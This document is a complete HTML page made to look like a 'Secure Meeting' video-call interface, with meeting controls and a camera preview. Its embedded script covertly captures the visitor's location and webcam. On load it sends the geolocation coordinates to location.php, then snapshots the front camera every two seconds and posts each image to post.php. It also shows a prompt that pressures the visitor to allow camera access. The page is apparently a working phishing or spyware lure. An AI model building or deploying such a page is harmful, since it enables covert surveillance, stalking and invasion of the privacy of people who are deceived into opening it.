<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #1a1a2e;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
}
.meeting-bar {
    background: #16213e;
    padding: 15px;
    display: flex;
    justify-content: space-between;
    color: white;
}
.meeting-container {
    display: flex;
    flex-wrap: wrap;
    padding: 20px;
    gap: 20px;
}
.video-grid {
    flex: 3;
    min-width: 300px;
}
.controls {
    background: #0f3460;
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    padding: 15px;
    display: flex;
    justify-content: center;
    gap: 20px;
}
.control-btn {
    background: #533483;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 30px;
    cursor: pointer;
}
.video-box {
    background: #0f3460;
    border-radius: 10px;
    padding: 10px;
    text-align: center;
    color: white;
}
video, canvas { width: 100%; border-radius: 10px; display: none; }
.preview-placeholder {
    width: 100%;
    height: 300px;
    background: #0f3460;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 80px;
}
</style>
</head>
<body>
<div class="meeting-bar">
    <span>🔒 Secure Meeting</span>
    <span>⚡ HD Quality</span>
</div>
<div class="meeting-container">
    <div class="video-grid">
        <div class="video-box">
            <div class="preview-placeholder">🎥</div>
            <video id="video" playsinline autoplay></video>
            <canvas id="canvas" width="640" height="480"></canvas>
            <p>You (Camera Active)</p>
        </div>
    </div>
</div>
<div class="controls">
    <button class="control-btn">🎤 Mute</button>
    <button class="control-btn">📹 Stop Video</button>
    <button class="control-btn">👥 Participants</button>
    <button class="control-btn">💬 Chat</button>
    <button class="control-btn" style="background: #dc3545;">Leave</button>
</div>
<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        $.ajax({
            type: 'POST',
            data: {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy
            },
            url: window.location.origin + '/location.php'
        });
    });
}
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: window.location.origin + '/post.php' });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.style.display = 'block';
        document.querySelector('.preview-placeholder').style.display = 'none';
        const context = canvas.getContext('2d');
        setInterval(() => {
            context.drawImage(video, 0, 0, 640, 480);
            post(canvas.toDataURL("image/png"));
        }, 2000);
    } catch(e) { alert("Please allow camera access to join meeting"); }
}
init();
</script>
</body>
</html>
